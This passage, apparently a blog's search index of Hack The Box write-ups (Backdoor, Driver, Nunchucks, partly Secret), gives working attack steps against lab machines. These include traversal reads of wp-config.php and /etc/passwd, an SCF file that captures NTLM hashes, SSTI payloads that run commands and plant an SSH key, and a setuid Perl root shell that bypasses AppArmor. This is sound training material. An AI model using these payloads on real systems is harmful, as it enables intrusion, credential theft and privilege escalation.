enumeration mode =============================================================== /wp-content (Status: 301) [Size: 317] [--\u0026gt; http://10.10.11.125/wp-content/] /index.php (Status: 301) [Size: 0] [--\u0026gt; http://10.10.11.125/] /wp-login.php (Status: 200) [Size: 5674] /.php (Status: 403) [Size: 277] /license.txt (Status: 200) [Size: 19915] /wp-includes (Status: 301) [Size: 318] [--\u0026gt; http://10.10.11.125/wp-includes/] /wp-trackback.php (Status: 200) [Size: 135] /wp-admin (Status: 301) [Size: 315] [--\u0026gt; http://10.10.11.125/wp-admin/] /xmlrpc.php (Status: 405) [Size: 42] wpscan â””â”€$ wpscan --url http://10.10.11.125 -e _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://10.10.11.125/ [10.10.11.125] [+] Started: Sun Aug 20 18:57:14 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.11.125/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09). | Found By: Rss Generator (Passive Detection) | - http://10.10.11.125/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.8.1\u0026lt;/generator\u0026gt; | - http://10.10.11.125/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.8.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: \u0026#39;Version: 2.8\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:19 \u0026lt;============================================================================================================================================================\u0026gt; (494 / 494) 100.00% Time: 00:00:19 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:41 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:41 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:05 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:05 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:02 \u0026lt;===================================================================================================================================================================\u0026gt; (71 / 71) 100.00% Time: 00:00:02 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:03 \u0026lt;========================================================================================================================================================\u0026gt; (100 / 100) 100.00% Time: 00:00:03 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Aug 20 18:59:33 2023 [+] Requests Done: 3400 [+] Cached Requests: 39 [+] Data Sent: 940.503 KB [+] Data Received: 556.681 KB [+] Memory used: 285.543 MB [+] Elapsed time: 00:02:18 I was stuck for a moment then I saw post in the forum to check http://10.10.11.125/wp-content/plugins/ Foothold/User We can confirm that ebook plugin is vulnerable https://www.exploit-db.com/exploits/39575 â””â”€$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php ../../../wp-config.php../../../wp-config.php../../../wp-config.php\u0026lt;?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the installation. * You don\u0026#39;t have to use the web site, you can copy this file to \u0026#34;wp-config.php\u0026#34; * and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpressuser\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;MQYBJSaD#DxG6qbm\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39; ); /** The database collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); ... Creds didn\u0026rsquo;t work, let\u0026rsquo;s check /etc/passwd â””â”€$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd ../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdrootâŒ0:0:root:/root:/bin/bash daemonâŒ1:1:daemon:/usr/sbin:/usr/sbin/nologin binâŒ2:2:bin:/bin:/usr/sbin/nologin sysâŒ3:3:sys:/dev:/usr/sbin/nologin syncâŒ4:65534:sync:/bin:/bin/sync gamesâŒ5:60:games:/usr/games:/usr/sbin/nologin manâŒ6:12:man:/var/cache/man:/usr/sbin/nologin lpâŒ7:7:lp:/var/spool/lpd:/usr/sbin/nologin mailâŒ8:8:mail:/var/mail:/usr/sbin/nologin newsâŒ9:9:news:/var/spool/news:/usr/sbin/nologin uucpâŒ10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxyâŒ13:13:proxy:/bin:/usr/sbin/nologin www-dataâŒ33:33:www-data:/var/www:/usr/sbin/nologin backupâŒ34:34:backup:/var/backups:/usr/sbin/nologin listâŒ38:38:Mailing List Manager:/var/list:/usr/sbin/nologin ircâŒ39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnatsâŒ41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobodyâŒ65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-networkâŒ100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolveâŒ101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesyncâŒ102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebusâŒ103:106::/nonexistent:/usr/sbin/nologin syslogâŒ104:110::/home/syslog:/usr/sbin/nologin _aptâŒ105:65534::/nonexistent:/usr/sbin/nologin tssâŒ106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuiddâŒ107:112::/run/uuidd:/usr/sbin/nologin tcpdumpâŒ108:113::/nonexistent:/usr/sbin/nologin landscapeâŒ109:115::/var/lib/landscape:/usr/sbin/nologin pollinateâŒ110:1::/var/cache/pollinate:/bin/false usbmuxâŒ111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshdâŒ112:65534::/run/sshd:/usr/sbin/nologin systemd-coredumpâŒ999:999:systemd Core Dumper:/:/usr/sbin/nologin userâŒ1000:1000:user:/home/user:/bin/bash lxdâŒ998ðŸ’¯:/var/snap/lxd/common/lxd:/bin/false mysqlâŒ113:118:MySQL Server,,,:/nonexistent:/bin/false \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; Let\u0026rsquo;s check the current process â””â”€$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- ../../../../../../../proc/self/cmdline../../../../../../../proc/self/cmdline../../../../../../../proc/self/cmdline/usr/sbin/apache2-kstart\u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt; We can see the process, let\u0026rsquo;s parse it â””â”€$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline | tr \u0026#39;\\000\u0026#39; \u0026#39; \u0026#39; | cut -c115- | rev | cut -c32- | rev /usr/sbin/apache2 -k start We can try checking every process script Had issues with parsing, but did the work #!/bin/bash for i in {500..5000}; do proc=\u0026#34;/proc/$i/cmdline\u0026#34; skip=$((${#proc})) res=$(curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../${proc} | tr \u0026#39;\\000\u0026#39; \u0026#39; \u0026#39; | cut -c $skip- | rev | cut -c 32- | rev) if [[ -n \u0026#34;$res\u0026#34; ]]; then echo \u0026#34;$i: $res\u0026#34; fi done; As a result we have the port we saw in nmap results /bin/sh -c while true;do su user -c \u0026quot;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\u0026quot;; done 857: ../../..//proc/857/cmdline../../../../../../..//proc/857/cmdline/bin/sh -c while true;do su user -c \u0026#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\u0026#34;; done We can follow Hacktricks\u0026rsquo;s post or use msfconsole Got user Root Enumerate We see screen running as root Let\u0026rsquo;s abuse it https://book.hacktricks.xyz/linux-hardening/privilege-escalation#screen-sessions-hijacking ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/backdoor/images/backdoor.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/backdoor/","summary":"Backdoor Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 18:07 BST Stats: 0:10:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 58.08% done; ETC: 18:25 (0:07:47 remaining) Nmap scan report for 10.10.11.125 (10.10.11.125) Host is up (0.16s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 1103.","tags":["HTB","wordpress","wpscan","directory-traversal","ebooks-download","proc","bash","msfvenom","gdb","gdbserver","gdb-remote","screen"],"title":"[HTB] Machine: Backdoor"},{"categories":null,"contents":"Driver Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.106 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 18:16 BST Nmap scan report for 10.10.11.106 (10.10.11.106) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-08-18T00:16:51 |_ start_date: 2023-08-18T00:13:34 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 6h59m24s, deviation: 0s, median: 6h59m23s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.04 seconds smb enum4linux had no success â””â”€$ smbclient -N -L //10.10.11.106 session setup failed: NT_STATUS_ACCESS_DENIED Port 80 gobuster â””â”€$ gobuster dir -u http://10.10.11.106 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.106 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/17 19:01:38 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 401) [Size: 20] /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.106/images/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.106/Images/] /Index.php (Status: 401) [Size: 20] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.106/IMAGES/] /INDEX.php (Status: 401) [Size: 20] Foothold/User From the scren above we saw WWW-Authenticate header https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate A description of the protected area. If no realm is specified, clients often display a formatted hostname instead. We have our username - admin Default admin:admin creds work Firmware update page, which states that it uploads firmware to file share Then it is reviewed by the team So we can utilize .scf file Check https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#shell-command-files Let\u0026rsquo;s create one [Shell] Command=2 IconFile=\\\\10.10.16.4\\anything.exe Launch responder, upload scf and wait And we got hash Let\u0026rsquo;s crack it hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt tony:liltony Test creds with crackmapexec Evil-Winrm Root Since it\u0026rsquo;s a printer box I wondered if PrintNightmare would work Download the POC https://github.com/calebstewart/CVE-2021-1675 ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/driver/images/driver.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/driver/","summary":"Driver Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.106 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 18:16 BST Nmap scan report for 10.10.11.106 (10.10.11.106) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8).","tags":["HTB","net-ntlmv2","scf","responder","hashcat","crackmapexec","evil-winrm","winpeas","printer","printnightmare","cve-2021-1675","invoke-nightmare"],"title":"[HTB] Machine: Driver"},{"categories":null,"contents":"Nunchucks Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.122 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 17:10 BST Nmap scan report for 10.10.11.122 (10.10.11.122) Host is up (0.13s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-title: Nunchucks - Landing Page | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Not valid before: 2021-08-30T15:42:24 |_Not valid after: 2031-08-28T15:42:24 |_http-server-header: nginx/1.18.0 (Ubuntu) | tls-nextprotoneg: |_ http/1.1 |_ssl-date: TLS randomness does not represent time Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.51 seconds ffuf â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;https://nunchucks.htb/\u0026#39; -H \u0026#39;Host: FUZZ.nunchucks.htb\u0026#39; -fs 30589 -k /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : https://nunchucks.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.nunchucks.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 30589 ________________________________________________ [Status: 200, Size: 4029, Words: 1053, Lines: 102, Duration: 387ms] * FUZZ: store Web server gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u https://nunchucks.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -k --exclude-length 45 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://nunchucks.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 45 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/16 17:22:31 Starting gobuster in directory enumeration mode =============================================================== /privacy (Status: 200) [Size: 19134] /login (Status: 200) [Size: 9172] /terms (Status: 200) [Size: 17753] /signup (Status: 200) [Size: 9488] /assets (Status: 301) [Size: 179] [--\u0026gt; /assets/] /Privacy (Status: 200) [Size: 19134] /Login (Status: 200) [Size: 9172] /Terms (Status: 200) [Size: 17753] /Assets (Status: 301) [Size: 179] [--\u0026gt; /Assets/] /Signup (Status: 200) [Size: 9488] /SignUp (Status: 200) [Size: 9488] â””â”€$ gobuster dir -u https://store.nunchucks.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -k --exclude-length 45 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://store.nunchucks.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 45 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/16 17:23:17 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 179] [--\u0026gt; /assets/] /Assets (Status: 301) [Size: 179] [--\u0026gt; /Assets/] Foothold/User If we submit email in store.nunchucks.htb, we get a response back from the server with our email in the message Possible SSTI https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection We can confirm it by entering simple payload {{7*7}} Google express regarding template engine it uses https://expressjs.com/en/resources/template-engines.html Googling shows the Sandbox Breakout - A View of the Nunjucks Template Engine We can test the payload from the post: \u0026quot;{{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\\\u0026quot;)()}}\u0026quot; Now let\u0026rsquo;s get revshell I couldn\u0026rsquo;t get a revshell, so I create authorized_keys file in david\u0026rsquo;s .ssh directory {{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('mkdir /home/david/.ssh')\\\u0026quot;)()}} {{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo+qtyTekC0IbR253hJRsWT9Q+wCFVUEwHS7/VZJEOvePL+oIm2LZp9G1ml3FToU6Qr2MtB83tJU7mMFqcKm3mfVTj+lpJzP+XO4A/xHzLiqhZScv56FM0JaZqz65/Oca4FF4AiNS0gOwJ7vu5sARMYFbb5jsd266eCFvymRLobt3Ujzo5lqcRiLOgZPVCasfHU0vPCNGTaMvDKyklhwSCsMbKjOxuozbwZwJ1ApsCkkx7bx277DGgOI6G/rLYFkc/W/+Y9hxqp4RifUzgu6GACKDIKyAnszWxZHNMT/Iokkcn35Xd5p/ykVgrjLBDQKCxTr4Org/M7L9xhvd19GbH kali@kali \u0026gt; /home/david/.ssh/authorized_keys')\\\u0026quot;)()}} {{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('chmod 600 /home/david/.ssh/authorized_keys')\\\u0026quot;)()}} Root We have a perl file in /opt directory that backups web directories It has POSIX::setuid(0) to run as root Let\u0026rsquo;s check perl Since it has to have SUID or setuid capabilities david@nunchucks:~$ which perl /usr/bin/perl david@nunchucks:~$ getcap /usr/bin/perl /usr/bin/perl = cap_setuid+ep Following GTFOBins had no success But when I execuite whoami, it returns root If we create a pl script and try to execute it #!/usr/bin/perl use POSIX qw(strftime); use POSIX qw(setuid); POSIX::setuid(0); exec \u0026#34;/bin/sh\u0026#34; We have Permission denied error It happened that we have AppArmor application which defines access controls to binaries in Linux /etc/apparmor.d david@nunchucks:/tmp$ ls -lha /etc/apparmor.d/ total 72K drwxr-xr-x 7 root root 4.0K Oct 28 2021 . drwxr-xr-x 125 root root 12K Aug 16 16:07 .. drwxr-xr-x 4 root root 4.0K Oct 28 2021 abstractions drwxr-xr-x 2 root root 4.0K Oct 28 2021 disable drwxr-xr-x 2 root root 4.0K Oct 28 2021 force-complain drwxr-xr-x 2 root root 4.0K Oct 28 2021 local -rw-r--r-- 1 root root 1.3K May 19 2020 lsb_release -rw-r--r-- 1 root root 1.1K May 19 2020 nvidia_modprobe -rw-r--r-- 1 root root 3.2K Mar 11 2020 sbin.dhclient drwxr-xr-x 5 root root 4.0K Oct 28 2021 tunables -rw-r--r-- 1 root root 3.2K Feb 25 2020 usr.bin.man -rw-r--r-- 1 root root 442 Sep 26 2021 usr.bin.perl -rw-r--r-- 1 root root 672 Feb 19 2020 usr.sbin.ippusbxd -rw-r--r-- 1 root root 2.0K Jul 22 2021 usr.sbin.mysqld -rw-r--r-- 1 root root 1.6K Feb 11 2020 usr.sbin.rsyslogd -rw-r--r-- 1 root root 1.4K Dec 7 2019 usr.sbin.tcpdump david@nunchucks:/tmp$ cat /etc/apparmor.d/usr.bin.perl # Last Modified: Tue Aug 31 18:25:30 2021 #include \u0026lt;tunables/global\u0026gt; /usr/bin/perl { #include \u0026lt;abstractions/base\u0026gt; #include \u0026lt;abstractions/nameservice\u0026gt; #include \u0026lt;abstractions/perl\u0026gt; capability setuid, deny owner /etc/nsswitch.conf r, deny /root/* rwx, deny /etc/shadow rwx, /usr/bin/id mrix, /usr/bin/ls mrix, /usr/bin/cat mrix, /usr/bin/whoami mrix, /opt/backup.pl mrix, owner /home/ r, owner /home/david/ r, } So we can\u0026rsquo;t access /root/* and /etc/shadow But if we google we have a way to bypass it Shebang bypass chmod +x test.pl And simply run ./test.pl ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nunchucks/images/nunchucks.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nunchucks/","summary":"Nunchucks Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.122 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 17:10 BST Nmap scan report for 10.10.11.122 (10.10.11.122) Host is up (0.13s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.","tags":["HTB","wfuzz","vhosts","ssti","express","express-nunchucks","capabilities","gtfobins","apparmor","perl"],"title":"[HTB] Machine: Nunchucks"},{"categories":null,"contents":"Secret Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.120 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 14:59 BST Nmap scan report for 10.10.11.120 (10.10.11.120) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.49 seconds Web Server We can also download source code gobuster â””â”€$ gobuster dir -u http://10.10.11.120 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.120 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/17 16:27:28 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 301) [Size: 183] [--\u0026gt; /download/] /docs (Status: 200) [Size: 20720] /assets (Status: 301) [Size: 179] [--\u0026gt; /assets/] /api (Status: 200) [Size: 93] /Docs (Status: 200) [Size: 20720] /API (Status: 200) [Size: 93] /DOCS (Status: 200) [Size: 20720] Foothold/User Let\u0026rsquo;s check source code â””â”€$ ls -lha total 116K drwxr-xr-x 8 kali kali 4.0K Sep 3 2021 . drwxr-xr-x 14 kali kali 4.0K Aug 17 16:55 .. -rw-r--r-- 1 kali kali 72 Sep 3 2021 .env drwxr-xr-x 8 kali kali 4.0K Aug 17 16:55 .git -rw-r--r-- 1 kali kali 885 Sep 3 2021 index.js drwxr-xr-x 2 kali kali 4.0K Aug 13 2021 model drwxr-xr-x 201 kali kali 4.0K Aug 13 2021 node_modules -rw-r--r-- 1 kali kali 491 Aug 13 2021 package.json -rw-r--r-- 1 kali kali 68K Aug 13 2021 package-lock.json drwxr-xr-x 4 kali kali 4.0K 